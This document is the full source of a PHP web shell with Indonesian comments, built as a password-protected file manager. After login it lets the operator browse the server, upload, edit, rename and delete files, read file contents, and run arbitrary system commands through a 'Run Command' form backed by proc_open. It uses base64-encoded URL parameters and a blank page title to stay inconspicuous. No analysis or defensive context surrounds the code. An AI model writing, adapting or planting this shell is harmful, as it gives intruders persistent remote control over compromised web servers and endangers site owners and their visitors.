<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
    <link href="https://fonts.googleapis.com/css?family=Arial:400,700" rel="stylesheet">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f0f0f0;
            color: #333;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 900px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            text-align: center;
            color: #333;
        }
        form {
            display: flex;
            flex-direction: column;
            margin-bottom: 20px;
        }
        form input[type="text"],
        form textarea,
        form input[type="file"] {
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            width: 100%;
            box-sizing: border-box;
        }
        form input[type="submit"] {
            padding: 10px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        form input[type="submit"]:hover {
            background-color: #218838;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border: 1px solid #ddd;
        }
        th {
            background-color: #f4f4f4;
        }
        tr:nth-child(even) {
            background-color: #f9f9f9;
        }
        tr:hover {
            background-color: #f1f1f1;
        }
        .folder {
            font-weight: bold;
            color: #007bff;
        }
        .file {
            color: #333;
        }
        .item-name {
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .size, .date {
            width: 100px;
        }
        .permission {
            font-weight: bold;
            width: 80px;
            text-align: center;
        }
        .writable {
            color: #28a745;
        }
        .not-writable {
            color: #dc3545;
        }
        .message {
            margin-bottom: 20px;
            padding: 10px;
            background-color: #e9ecef;
            border: 1px solid #ced4da;
            border-radius: 4px;
        }
    </style>
</head>
<body>
<div class="container">
    <?php
    // Menggunakan password_hash dan password_verify untuk keamanan yang lebih baik
    $hashed_password = '$2y$10$2GTB6Y9iUo3VJAItZN4e1.VYTJ.nWSK/c5ds8HhKCg9gJd7yg74Ke';

    // Fungsi untuk menampilkan form login
    function admin_login() {
        echo '<form method="post">';
        echo '<input type="password" name="password" placeholder="Enter Password">';
        echo '<input type="submit" value="Login">';
        echo '</form>';
        exit;
    }

    if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
        // Memeriksa apakah password dikirim dan benar
        if(isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
            setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200); // Cookie berlaku selama 1 jam
            // Logika setelah login berhasil
        } else {
            admin_login();
        }
    }

    $timezone = date_default_timezone_get();
    date_default_timezone_set($timezone);
    $rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
    $scriptDirectory = dirname(__FILE__);

    function x($b) {
        return base64_encode($b);
    }

    function y($b) {
        return base64_decode($b);
    }

    foreach ($_GET as $c => $d) $_GET[$c] = y($d);

    $currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
    chdir($currentDirectory);

    $viewCommandResult = '';

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_FILES['fileToUpload'])) {
            $target_file = $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]);
            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
                echo "<div class='message'>File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " uploaded successfully.</div>";
            } else {
                echo "<div class='message'>Error: Failed to upload file.</div>";
            }
        } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
            $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
            if (!file_exists($newFolder)) {
                mkdir($newFolder);
                echo "<div class='message'>Folder created successfully!</div>";
            } else {
                echo "<div class='message'>Error: Folder already exists!</div>";
            }
        } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
            $fileName = $_POST['file_name'];
            $newFile = $currentDirectory . '/' . $fileName;
            if (!file_exists($newFile)) {
                if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                    echo "<div class='message'>File created successfully!</div>";
                } else {
                    echo "<div class='message'>Error: Failed to create file!</div>";
                }
            } else {
                if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                    echo "<div class='message'>File edited successfully!</div>";
                } else {
                    echo "<div class='message'>Error: Failed to edit file!</div>";
                }
            }
        } elseif (isset($_POST['delete_file'])) {
            $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
            if (file_exists($fileToDelete)) {
                if (is_dir($fileToDelete)) {
                    if (deleteDirectory($fileToDelete)) {
                        echo "<div class='message'>Folder deleted successfully!</div>";
                    } else {
                        echo "<div class='message'>Error: Failed to delete folder!</div>";
                    }
                } else {
                    if (unlink($fileToDelete)) {
                        echo "<div class='message'>File deleted successfully!</div>";
                    } else {
                        echo "<div class='message'>Error: Failed to delete file!</div>";
                    }
                }
            } else {
                echo "<div class='message'>Error: File or directory not found!</div>";
            }
        } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
            $oldName = $currentDirectory . '/' . $_POST['old_name'];
            $newName = $currentDirectory . '/' . $_POST['new_name'];
            if (file_exists($oldName)) {
                if (rename($oldName, $newName)) {
                    echo "<div class='message'>Item renamed successfully!</div>";
                } else {
                    echo "<div class='message'>Error: Failed to rename item!</div>";
                }
            } else {
                echo "<div class='message'>Error: Item not found!</div>";
            }
        } elseif (isset($_POST['xmd_input'])) {
            $command = $_POST['xmd_input'];
            $descriptorspec = [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w']
            ];
            $process = proc_open($command, $descriptorspec, $pipes);
            if (is_resource($process)) {
                $output = stream_get_contents($pipes[1]);
                $errors = stream_get_contents($pipes[2]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
                if (!empty($errors)) {
                    $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($errors) . '</textarea>';
                } else {
                    $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($output) . '</textarea>';
                }
            } else {
                $viewCommandResult = '<hr><p>Error: Failed to execute command!</p>';
            }
        } elseif (isset($_POST['view_file'])) {
            $fileToView = $currentDirectory . '/' . $_POST['view_file'];
            if (file_exists($fileToView)) {
                $fileContent = file_get_contents($fileToView);
                $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
            } else {
                $viewCommandResult = '<hr><p>Error: File not found!</p>';
            }
        }
    }

    echo '<hr>Current Directory: ';

    $directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
    $currentPath = '';
    foreach ($directories as $index => $dir) {
        $currentPath .= DIRECTORY_SEPARATOR . $dir;
        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    }

    echo '<a href="?d=' . x($scriptDirectory) . '"> / <span style="color: green;">[ GO Home ]</span></a>';
    echo '<br><hr>';

    echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
    echo '<input type="text" name="folder_name" placeholder="New Folder Name">';
    echo '<input type="submit" value="Create Folder">';
    echo '</form>';

    echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
    echo '<input type="text" name="file_name" placeholder="Create New File / Edit Existing File">';
    echo '<textarea name="file_content" placeholder="File Content (for new file) or Edit Content (for existing file)"></textarea>';
    echo '<input type="submit" value="Create / Edit File">';
    echo '</form>';

    echo '<form method="post" enctype="multipart/form-data">';
    echo '<input type="file" name="fileToUpload" id="fileToUpload" placeholder="Choose file">';
    echo '<input type="submit" value="Upload File" name="submit">';
    echo '</form>';

    echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
    echo '<input type="text" name="xmd_input" placeholder="Enter command">';
    echo '<input type="submit" value="Run Command">';
    echo '</form>';

    echo $viewCommandResult;

    echo '<table>';
    echo '<tr><th>Item Name</th><th>Size</th><th>Date</th><th>Permissions</th><th>View</th><th>Delete</th><th>Rename</th></tr>';

    $directories = [];
    $files = [];

    foreach (scandir($currentDirectory) as $item) {
        if ($item == '.' || $item == '..') continue;

        if (is_dir($item)) {
            $directories[] = $item;
        } else {
            $files[] = $item;
        }
    }

    foreach ($directories as $dir) {
        $u = realpath($dir);
        $s = stat($u);
        $itemLink = '?d=' . x($currentDirectory . '/' . $dir);
        $permission = substr(sprintf('%o', fileperms($u)), -4);
        $writable = is_writable($u);
        echo '<tr>
                <td class="item-name folder"><a href="'.$itemLink.'">'.$dir.'</a></td>
                <td class="size">--</td>
                <td class="date" style="text-align: center;">'.date('Y-m-d H:i:s', $s['mtime']).'</td>
                <td class="permission '.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>
                <td><form method="post"><input type="hidden" name="view_file" value="'.htmlspecialchars($dir).'"><input type="submit" value="View" disabled></form></td>
                <td><form method="post"><input type="hidden" name="delete_file" value="'.htmlspecialchars($dir).'"><input type="submit" value="Delete"></form></td>
                <td><form method="post"><input type="hidden" name="old_name" value="'.htmlspecialchars($dir).'"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
            </tr>';
    }

    foreach ($files as $file) {
        $u = realpath($file);
        $s = stat($u);
        $itemLink = '?d=' . x($currentDirectory) . '&f=' . x($file);
        $permission = substr(sprintf('%o', fileperms($u)), -4);
        $writable = is_writable($u);
        echo '<tr>
                <td class="item-name file"><a href="'.$itemLink.'">'.$file.'</a></td>
                <td class="size">'.filesize($u).'</td>
                <td class="date" style="text-align: center;">'.date('Y-m-d H:i:s', $s['mtime']).'</td>
                <td class="permission '.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>
                <td><form method="post"><input type="hidden" name="view_file" value="'.htmlspecialchars($file).'"><input type="submit" value="View"></form></td>
                <td><form method="post"><input type="hidden" name="delete_file" value="'.htmlspecialchars($file).'"><input type="submit" value="Delete"></form></td>
                <td><form method="post"><input type="hidden" name="old_name" value="'.htmlspecialchars($file).'"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
            </tr>';
    }

    echo '</table>';

    function deleteDirectory($dir) {
        if (!file_exists($dir)) {
            return true;
        }
        if (!is_dir($dir)) {
            return unlink($dir);
        }
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
                return false;
            }
        }
        return rmdir($dir);
    }
    ?>
</div>
</body>
</html>
